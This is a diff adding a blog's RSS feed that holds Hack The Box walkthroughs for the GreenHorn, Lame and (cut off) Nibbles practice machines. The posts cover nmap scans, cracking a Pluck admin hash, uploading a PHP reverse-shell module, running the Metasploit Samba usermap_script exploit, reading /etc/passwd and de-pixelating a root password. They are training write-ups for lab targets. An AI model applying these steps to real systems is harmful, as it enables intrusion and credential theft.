@@ -1,0 +1,759 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>Posts on d0natell0&#39;s Blog</title>
+        <link>//localhost:1313/posts/</link>
+        <description>Recent content in Posts on d0natell0&#39;s Blog</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en</language>
+        <lastBuildDate>Thu, 25 Jul 2024 22:35:00 +0300</lastBuildDate>
+        <atom:link href="//localhost:1313/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Green Horn Machine</title>
+            <link>//localhost:1313/posts/2024/green-horn-machine/</link>
+            <pubDate>Thu, 25 Jul 2024 22:35:00 +0300</pubDate>
+            
+            <guid>//localhost:1313/posts/2024/green-horn-machine/</guid>
+            <description>First Steps Nmap initial scan We start the enumeration of the target with a recognition scan
+sudo nmap -p- --min-rate 5000 -n -Pn 10.129.50.188 -oA first_scan_10.129.50.188 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-24 17:59 -03 Nmap scan report for 10.129.50.188 Host is up (0.19s latency). Not shown: 65532 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 3000/tcp open ppp Nmap done: 1 IP address (1 host up) scanned in 19.</description>
+            <content type="html"><![CDATA[<hr>
+<h2 id="first-steps">First Steps</h2>
+<h3 id="nmap-initial-scan">Nmap initial scan</h3>
+<p>We start the enumeration of the target with a recognition scan</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span> sudo nmap -p- --min-rate <span style="color:#ae81ff">5000</span> -n -Pn 10.129.50.188 -oA first_scan_10.129.50.188
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-07-24 17:59 -03
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.50.188
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.19s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65532</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh
+</span></span><span style="display:flex;"><span>80/tcp   open  http
+</span></span><span style="display:flex;"><span>3000/tcp open  ppp
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 19.09 seconds
+</span></span></code></pre></div><p>The result shows that <em>ports 22(SSH), 80(HTTP) and 3000(ppp) are open</em>, in particular the port 3000 is striking because it is not a recognized service at first sight. Now it is time to see which versions of the services are running to get more information about them.</p>
+<h3 id="services-version-scan">Services version scan</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sudo nmap -p22,80,300 -sV --min-rate <span style="color:#ae81ff">5000</span> 10.129.50.188 -oA services_scan_10.129.50.188
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-07-24 18:01 -03
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.50.188
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.18s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT    STATE  SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp  open   ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp  open   http    nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>3000/tcp open  ppp     unknown 
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 8.78 seconds
+</span></span></code></pre></div><p><em>With the result of the scan we have an idea what we are dealing with but we still don&rsquo;t know what is in port 3000</em>. We will investigate soon, for the moment let&rsquo;s see what website is running on port 80.</p>
+<p><em>We put the ip in the browser bar</em> but it will tell us that it does not find the domain (http:// greenhorn.htb) so we must add it to the <em>/etc/hosts file</em>.
+10.129.50.188 greenhorn.htb</p>
+
+    <img src="../../../green-horn-img/etc-host-ip.png"  alt="greenhorn.htb website"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Now if we go back to the browser and see that we already have access to the home page hosted on port 80.</p>
+
+    <img src="../../../green-horn-img/website-homepage.png"  alt="greenhorn.htb website"  class="center"  style="border-radius: 8px;"  />
+
+
+<p><em>After investigating the page a little we can see that you can access a login panel for the site administrator and also see that it is using a CMS (content management system) called Pluck</em>.</p>
+<p>
+    <img src="../../../green-horn-img/login-admin-panel.png"  alt="greenhorn.htb website"  class="center"  style="border-radius: 8px;"  />
+
+
+(nothing hidden in the source-code)</p>
+<p><em>In the footer we can see the version of Pluck that is running, it is version 4.7.18</em>. Now that we know this we can see if there is an exploit for Pluck in the version we found running on the site.</p>
+<hr>
+<h3 id="looking-for-pluck-exploits">Looking for Pluck exploits</h3>
+<p>If we do a google search for pluck exploit, we can see that there is an exploit just for that version in which abuses a misconfigured file that allows us to upload a module in which we can insert malicious code, <em>the format must be .zip and must be written in PHP</em>. So we could use <em>a reverse shell payload</em> and thus be able to perform a remote code execution <em>(RCE)</em>.</p>
+<p>
+    <img src="../../../green-horn-img/exploit-db-finding.png"  alt="greenhorn.htb website"  class="center"  style="border-radius: 8px;"  />
+
+
+https: //www.exploit-db.com/exploits/51592</p>
+<hr>
+<h3 id="checking-whats-in-the-port-3000">Checking whats in the port 3000</h3>
+<p>To see that it is hosted on port 3000 enter the url “greenhorn.htb:3000” in the browser.</p>
+<blockquote>
+<p>It appears that Greenhorn is a self-hosted version control system for git that you install and manage on your own servers or infrastructure, rather than using an external hosting platform such as GitHub, GitLab.com or Bitbucket.</p>
+</blockquote>
+
+    <img src="../../../green-horn-img/greenhorn-homepage.png"  alt="greenhorn.htb website"  class="center"  style="border-radius: 8px;"  />
+
+
+<p><em>I explored the site a bit but the only place that catches our attention is the explore section.</em></p>
+
+    <img src="../../../green-horn-img/port-3000-exploring.png"  alt="greenhorn.htb website"  class="center"  style="border-radius: 8px;"  />
+
+
+
+    <img src="../../../green-horn-img/finding-greenhorn-serversite.png"  alt="greenhorn.htb website"  class="center"  style="border-radius: 8px;"  />
+
+
+<p><em>What we see here seems to be the internal structure of Pluck</em>, because after seeing the <em>robots.txt</em> file that showed that there are the directories called /data/ and /files/, we can also see that this is here a file called login.php (remember that if we clicked admin we got redirect to login.php). So we are well on our way.</p>
+
+    <img src="../../../green-horn-img/robots-txt.png"  alt="greenhorn.htb website"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>After a while reading the files and looking at the folders <em>I could see that in login.php from line 38 to 43 we see that it says that this block of code is for when the service is already installed, which is our case</em>. And that <em>the password is stored in pass.php and is required only once</em>, it is also the same for the token, so let&rsquo;s see what we find in pass.php and token.php.</p>
+
+    <img src="../../../green-horn-img/finding-location-default-credentials.png"  alt="greenhorn.htb website"  class="center"  style="border-radius: 8px;"  />
+
+
+<h4 id="passphp">pass.php</h4>
+<p>Looks like we have a hash to crack</p>
+
+    <img src="../../../green-horn-img/finding-password-default-hash.png"  alt="greenhorn.htb website"  class="center"  style="border-radius: 8px;"  />
+
+
+<h4 id="tokenphp">token.php</h4>
+<p>We have a token that we can use to authenticate our requests.</p>
+
+    <img src="../../../green-horn-img/finding-token-hash.png"  alt="greenhorn.htb website"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Now that we have found this hash that could be the possible admin password, let&rsquo;s go to crackstation to get the decrypted password.</p>
+<p><a href="https://crackstation.net/">Crackstation</a></p>
+
+    <img src="../../../green-horn-img/cracking-the-hash-founded.png"  alt="greenhorn.htb website"  class="center"  style="border-radius: 8px;"  />
+
+
+<p><em>The password is: iloveyou1</em></p>
+<hr>
+<h3 id="using-the-password-found-in-the-admin-login-page">Using the password found in the admin login page</h3>
+<p>After finding the password, we can use it to access the admin page.</p>
+
+    <img src="../../../green-horn-img/putting-the-correct-password.png"  alt="greenhorn.htb website"  class="center"  style="border-radius: 8px;"  />
+
+
+
+    <img src="../../../green-horn-img/password-success.png"  alt="greenhorn.htb website"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>And there we have it!! we can now access the main administrator panel</p>
+
+    <img src="../../../green-horn-img/admin-panel-modules-manage.png"  alt="greenhorn.htb website"  class="center"  style="border-radius: 8px;"  />
+
+
+<hr>
+<h3 id="the-exploiting-phase">The exploiting phase</h3>
+<p>We already know from the exploit that we can load a module with malicious code to the site and we can abuse it by inserting a reverse shell.</p>
+<p><em>We can use the one from pentestmonkey</em>
+<a href="https://github.com/pentestmonkey/php-reverse-shell">Revershell</a></p>
+<p>Once we have cloned the git repository and have the php-reverse-shell in our path we can compress it and get it ready to use.</p>
+<p><strong>(Remember to change in the file rever-shell.php the IP and port)</strong></p>
+
+    <img src="../../../green-horn-img/zip-reverse-shell-payload.png"  alt="greenhorn.htb website"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>So now we go back to the admin panel, go to the module manager and upload our payload.</p>
+
+    <img src="../../../green-horn-img/use-of-exploit-uploading-zip.png"  alt="greenhorn.htb website"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Now we just have to listen with the netcat tool (nc) on the chosen port and wait for the connection. If everything goes well we should have access to the machine.</p>
+<blockquote>
+<p>Depending on the connection you may have to make several attempts before you get a connection, something I found is that as soon as the banner appeared saying that the file upload was successful I stopped the page reload&hellip; for some reason that prevented the connection.</p>
+</blockquote>
+
+    <img src="../../../green-horn-img/ncat-server-access.png"  alt="greenhorn.htb website"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Let&rsquo;s get a nice shell using the old python trick.</p>
+
+    <img src="../../../green-horn-img/reverse-shell-server-access.png"  alt="greenhorn.htb website"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Immediately we go to the <em>/home directory where we will see the directories for the git and junior users</em>. If we go to git we will not find anything, on the other hand in the junior directory there are interesting things.</p>
+
+    <img src="../../../green-horn-img/reverse-shell-foothold.png"  alt="greenhorn.htb website"  class="center"  style="border-radius: 8px;"  />
+
+
+<p><em>lets try the password we found ;)</em></p>
+
+    <img src="../../../green-horn-img/user-access-server.png"  alt="greenhorn.htb website"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Running as the user Junior we can get the first flag
+also i tried sudo -l to check if there is some sudo rules for junior&hellip; but there is none.</p>
+
+    <img src="../../../green-horn-img/getting-user-flag-sudo-failed.png"  alt="greenhorn.htb website"  class="center"  style="border-radius: 8px;"  />
+
+
+<hr>
+<h3 id="privileges-escalation-root-access">Privileges escalation (Root access)</h3>
+<p>To get root access we have to investigate <em>a file that its called &lsquo;Using OpenVAS.pdf&rsquo;</em> we have to create a .pdf of the file first and then open a python server on the target machine we can get that file.</p>
+
+    <img src="../../../green-horn-img/copying-file-openvas-http-server.png"  alt="greenhorn.htb website"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>With the file on our machine we can check what&rsquo;s inside it</p>
+
+    <img src="../../../green-horn-img/openvas-file-opened.png"  alt="greenhorn.htb website"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Once we open it we can see that people from greenhorn <em>gave the junior the password for the root user</em> but it is pixelated , <em>we have to use a tool called poppler-utils</em></p>
+
+    <img src="../../../green-horn-img/installing-poppler-utils.png"  alt="greenhorn.htb website"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Then we use the tool to create a file that extracts the pixels from it</p>
+
+    <img src="../../../green-horn-img/use-poppler-utils-pdf.png"  alt="greenhorn.htb website"  class="center"  style="border-radius: 8px;"  />
+
+
+<blockquote>
+<p>PPM is short for Portable Pixmap Format. Although these files are rare these days, you can spot one by looking out for the .PPM extension.</p>
+</blockquote>
+<p>Once we did this, <em>we need another tool</em> to get the password. <em>This one is called Depix</em> and we can get it at <a href="https://github.com/spipm/Depix">Depix</a></p>
+
+    <img src="../../../green-horn-img/depix-tool-clone.png"  alt="greenhorn.htb website"  class="center"  style="border-radius: 8px;"  />
+
+
+
+    <img src="../../../green-horn-img/use-depix-tool.png"  alt="greenhorn.htb website"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Once the de-pixelation process is finished, we open the file that the tool gave us and we will see the password for the root user.</p>
+
+    <img src="../../../green-horn-img/depixelated-root-password.png"  alt="greenhorn.htb website"  class="center"  style="border-radius: 8px;"  />
+
+
+<p><em>The password is: sidefromsidetheothersidesidefromsidetheotherside</em> (What a password dude..)</p>
+<p>Now that we have the root user&rsquo;s password we access his account and we can get the last flag to finish the machine!</p>
+
+    <img src="../../../green-horn-img/root-access-server.png"  alt="greenhorn.htb website"  class="center"  style="border-radius: 8px;"  />
+
+
+<p><em>The root flag is right in front of our eyes let&rsquo;s get it!</em></p>
+
+    <img src="../../../green-horn-img/root-flag.png"  alt="greenhorn.htb website"  class="center"  style="border-radius: 8px;"  />
+
+
+]]></content>
+        </item>
+        
+        <item>
+            <title>Lame machine HTB</title>
+            <link>//localhost:1313/posts/2024/lame-machine-htb/</link>
+            <pubDate>Wed, 17 Jul 2024 22:42:00 +0300</pubDate>
+            
+            <guid>//localhost:1313/posts/2024/lame-machine-htb/</guid>
+            <description>Introduction Lame is a beginner-level machine from Hack The Box, perfect for those starting their journey in penetration testing. This walkthrough will guide you through the process of compromising the machine, explaining each step and tool used along the way.
+Target IP: 10.129.79.228
+Enumeration Enumeration is the first and crucial step in any penetration test. It involves gathering information about the target system to identify potential vulnerabilities.
+Initial Nmap Scan We start with a comprehensive Nmap scan to discover open ports and services:</description>
+            <content type="html"><![CDATA[<hr>
+<h3 id="introduction">Introduction</h3>
+<p>Lame is a beginner-level machine from Hack The Box, perfect for those starting their journey in penetration testing. This walkthrough will guide you through the process of compromising the machine, explaining each step and tool used along the way.</p>
+<hr>
+<p><strong>Target IP:</strong> 10.129.79.228</p>
+<hr>
+<h3 id="enumeration">Enumeration</h3>
+<blockquote>
+<p>Enumeration is the first and crucial step in any penetration test. It involves gathering information about the target system to identify potential vulnerabilities.</p>
+</blockquote>
+<hr>
+<h3 id="initial-nmap-scan">Initial Nmap Scan</h3>
+<p>We start with a comprehensive Nmap scan to discover open ports and services:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -sV -p- --open --min-rate <span style="color:#ae81ff">5000</span> -n -Pn 10.129.79.228 -v -oN first_scan
+</span></span></code></pre></div><p><strong>Let&rsquo;s break down this command</strong></p>
+<p>sudo: Run Nmap with root privileges</p>
+<ul>
+<li>-sV: Probe open ports to determine service/version info</li>
+<li>-p-: Scan all ports</li>
+<li>&ndash;open: Only show open (or possibly open) ports</li>
+<li>&ndash;min-rate 5000: Send packets no slower than 5000 per second</li>
+<li>-n: No DNS resolution</li>
+<li>-Pn: Treat all hosts as online &ndash; skip host discovery</li>
+<li>-v: Verbose output</li>
+<li>-oN first_scan: Output in normal format to file &lsquo;first_scan&rsquo;</li>
+</ul>
+<hr>
+<p><em>Results:</em></p>
+<ul>
+<li>Port 21: FTP (vsftpd 2.3.4)</li>
+<li>Port 22: SSH (OpenSSH 4.7p1 Debian 8ubuntu1)</li>
+<li>Port 139: Samba smbd 3.X - 4.X</li>
+<li>Port 445: Samba smbd 3.X - 4.X</li>
+</ul>
+<p>OS: Unix/Linux</p>
+<hr>
+<blockquote>
+<p>This scan gives us an overview of the services running on the target machine, helping us focus our further enumeration efforts.</p>
+</blockquote>
+<hr>
+<h3 id="further-enumeration-ftp-port-21">Further Enumeration FTP (Port 21)</h3>
+<p>We perform a more detailed scan of the FTP service:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sudo nmap -sVC -p21 10.129.79.228 -v -oN script_scan_port_21
+</span></span></code></pre></div><p>This command uses -sVC to run default scripts (-sC) and version scanning (-sV) on port 21.</p>
+<hr>
+<p><strong>Findings:</strong></p>
+<ul>
+<li>Anonymous FTP login allowed</li>
+<li>ASCII type</li>
+<li>Plain text connections</li>
+</ul>
+<p>These findings suggest that the FTP server might be vulnerable to anonymous access. Let&rsquo;s try to connect:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ftp anonymous@10.129.79.228
+</span></span></code></pre></div><p><em>Result:</em> Successfully logged in, but no interesting files found.</p>
+<hr>
+<h3 id="samba-port-139">Samba (Port 139)</h3>
+<p>Next, we focus on the Samba service:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -sVC -p139 10.129.79.228 -v -oN script_scan_port_139
+</span></span></code></pre></div><p><strong>Findings:</strong></p>
+<ul>
+<li>OS: Unix (Samba 3.0.20-Debian)</li>
+<li>Computer name: lame</li>
+<li>Domain name: hackthebox.gr</li>
+<li>FQDN: lame.hackthebox.gr</li>
+</ul>
+<p>This information helps us understand the target environment better.</p>
+<hr>
+<h3 id="smb-enumeration">SMB Enumeration</h3>
+<p>We use smbclient to list available shares:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbclient -N -L //10.129.79.228/
+</span></span></code></pre></div><blockquote>
+<p>smbclient is a tool for accessing SMB/CIFS resources on servers. The -N option suppresses the password prompt, and -L lists the available shares.</p>
+</blockquote>
+<hr>
+<p><strong>Discovered shares:</strong></p>
+<ul>
+<li>print$</li>
+<li>tmp</li>
+<li>opt</li>
+<li>IPC$</li>
+<li>ADMIN$</li>
+</ul>
+<p>We then attempt to access the &rsquo;tmp&rsquo; share:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbclient -N //10.129.79.228/tmp
+</span></span></code></pre></div><p>While we found some files, nothing immediately useful for exploitation was discovered.</p>
+<hr>
+<h3 id="2-vulnerability-identification">2. Vulnerability Identification</h3>
+<p>After researching the versions of services found, particularly Samba 3.0.20, we identified a potential exploit:</p>
+<p>Samba &ldquo;username map script&rdquo; Command Execution</p>
+<p>This vulnerability allows for remote command execution, which could give us a foothold on the system.</p>
+<hr>
+<h3 id="3-exploitation">3. Exploitation</h3>
+<p><strong>Using Metasploit</strong></p>
+<p>Metasploit is a powerful penetration testing framework that provides a collection of exploits and auxiliary tools.</p>
+<p>Start Metasploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>msfconsole
+</span></span></code></pre></div><hr>
+<p><strong>Search for the Samba exploit:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfconsole&gt; search samba
+</span></span></code></pre></div>
+    <img src="../../../lame-machine-img/1.png"  alt="metasploit"  class="center"  style="border-radius: 8px;"  />
+
+
+<hr>
+<p><strong>Select and configure the exploit:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfconsole&gt; use exploit/multi/samba/usermap_script
+</span></span><span style="display:flex;"><span>msfconsole&gt; set RHOSTS 10.129.79.228
+</span></span><span style="display:flex;"><span>msfconsole&gt; set LHOST <span style="color:#f92672">[</span>Your IP<span style="color:#f92672">]</span>
+</span></span></code></pre></div>
+    <img src="../../../lame-machine-img/2.png"  alt="metasploit"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Here, we&rsquo;re setting up the exploit with our target IP (RHOSTS) and our own IP (LHOST) for the reverse shell connection.</p>
+<hr>
+<p>Run the exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfconsole&gt; run
+</span></span></code></pre></div>
+    <img src="../../../lame-machine-img/3.png"  alt="metasploit"  class="center"  style="border-radius: 8px;"  />
+
+
+<hr>
+<h3 id="4-post-exploitation">4. Post-Exploitation</h3>
+<p>Once we have access to the system, our goal is to find and extract valuable information, such as flags in a CTF scenario.</p>
+<p><strong>Obtaining Root Flag</strong></p>
+<p>Navigate to root directory:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cd root
+</span></span></code></pre></div>
+    <img src="../../../lame-machine-img/4.png"  alt="reverse-shell"  class="center"  style="border-radius: 8px;"  />
+
+
+<hr>
+<p><strong>Cat the root flag:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat root.txt
+</span></span></code></pre></div><hr>
+<p><strong>Obtaining User Flag</strong></p>
+<p><em>Identify users:</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /etc/passwd
+</span></span></code></pre></div><blockquote>
+<p>This file contains user account information.</p>
+</blockquote>
+<p>
+    <img src="../../../lame-machine-img/5.png"  alt="reverse-shell"  class="center"  style="border-radius: 8px;"  />
+
+
+
+    <img src="../../../lame-machine-img/6.png"  alt="reverse-shell"  class="center"  style="border-radius: 8px;"  />
+
+</p>
+<hr>
+<p>Switch to user &lsquo;makis&rsquo;:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>su makis
+</span></span></code></pre></div>
+    <img src="../../../lame-machine-img/7.png"  alt="reverse-shell"  class="center"  style="border-radius: 8px;"  />
+
+
+<hr>
+<p>Navigate to makis&rsquo;s home directory:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cd 
+</span></span></code></pre></div>
+    <img src="../../../lame-machine-img/8.png"  alt="reverse-shell"  class="center"  style="border-radius: 8px;"  />
+
+
+<hr>
+<p>Cat the user flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat user.txt
+</span></span></code></pre></div>
+    <img src="../../../lame-machine-img/9.png"  alt="reverse-shell"  class="center"  style="border-radius: 8px;"  />
+
+
+<hr>
+<h3 id="conclusion">Conclusion</h3>
+<p>In this walkthrough, we successfully compromised the Lame machine by exploiting an outdated Samba version. We used various tools and techniques common in penetration testing:</p>
+<ul>
+<li>Nmap for initial reconnaissance and service enumeration</li>
+<li>smbclient for SMB share exploration</li>
+<li>Metasploit for exploit delivery</li>
+</ul>
+<hr>
+<h3 id="additional-notes">Additional Notes</h3>
+<p>We found an id_dsa key in makis&rsquo;s .ssh directory but couldn&rsquo;t use it due to outdated key types.</p>
+<p>This highlights the importance of keeping SSH configurations up-to-date.</p>
+<p>Creating a new SSH key as root wasn&rsquo;t feasible without makis&rsquo;s password, demonstrating proper user privilege separation.</p>
+<p>While it&rsquo;s possible to crack makis&rsquo;s password hash from /etc/shadow, it wasn&rsquo;t necessary for this challenge. However, in a real-world scenario, this could be a potential avenue for further exploitation.</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Nibbles Machine HTB</title>
+            <link>//localhost:1313/posts/2024/nibbles-machine-htb/</link>
+            <pubDate>Mon, 15 Jul 2024 18:00:00 +0300</pubDate>
+            
+            <guid>//localhost:1313/posts/2024/nibbles-machine-htb/</guid>
+            <description>Nibbles is a fairly simple machine, however with the inclusion of a login blacklist, it is a fair bit more challenging to find valid credentials. Luckily, a username can be enumerated and guessing the correct password does not take long for most.
+Enumeration We need to start by mapping the target network. To do this, we&amp;rsquo;ll use Nmap with several flags:
+The -sV flag helps us get the service versions running on the ports.</description>
+            <content type="html"><![CDATA[<p>Nibbles is a fairly simple machine, however with the inclusion of a login blacklist, it is a fair bit more challenging to find valid credentials. Luckily, a username can be enumerated and guessing the correct password does not take long for most.</p>
+<hr>
+<h3 id="enumeration">Enumeration</h3>
+<p>We need to start by mapping the target network. To do this, we&rsquo;ll use Nmap with several flags:</p>
+<ul>
+<li>The -sV flag helps us get the service versions running on the ports.</li>
+<li>The &ndash;open flag shows only open ports.</li>
+<li>The -n flag tells Nmap not to resolve DNS, which can speed up the scan.</li>
+<li>The -oA flag generates output in all available formats (Nmap, grepable, XML, etc.).</li>
+</ul>
+<p>These options will give us a comprehensive view of the target&rsquo;s network structure and services.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>❯ nmap -sV --open -n -oA nibbles_initial_scan 10.10.10.75
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-06-23 20:52 -03
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.75
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.23s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">997</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>, <span style="color:#ae81ff">1</span> filtered tcp port <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.18 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 13.51 seconds
+</span></span></code></pre></div><h4 id="from-the-result-of-out-scanning-we-can-see">From the result of out scanning we can see</h4>
+<ul>
+<li>Port 22: SSH service (OpenSSH, running on Ubuntu 4ubuntu2.2)</li>
+<li>Port 80: HTTP service (Apache web server version 2.4.18)</li>
+</ul>
+<h3 id="running-common-scripts-from-nmap-on-ports-80-and-22">Running common scripts from Nmap on ports 80 and 22</h3>
+<ul>
+<li>The -sC flag stands for &ldquo;script scan&rdquo; or &ldquo;default script scan&rdquo;.</li>
+<li>It runs a set of scripts that are considered safe and useful for general reconnaissance.</li>
+<li>These scripts are part of the Nmap Scripting Engine (NSE).</li>
+<li>They can provide additional information about the target, such as service details, vulnerabilities, or misconfigurations.</li>
+</ul>
+<blockquote>
+<p>The -sC option is equivalent to &ndash;script=default in Nmap. It&rsquo;s a popular choice for initial scans because it can reveal valuable information without being overly intrusive or time-consuming.</p>
+</blockquote>
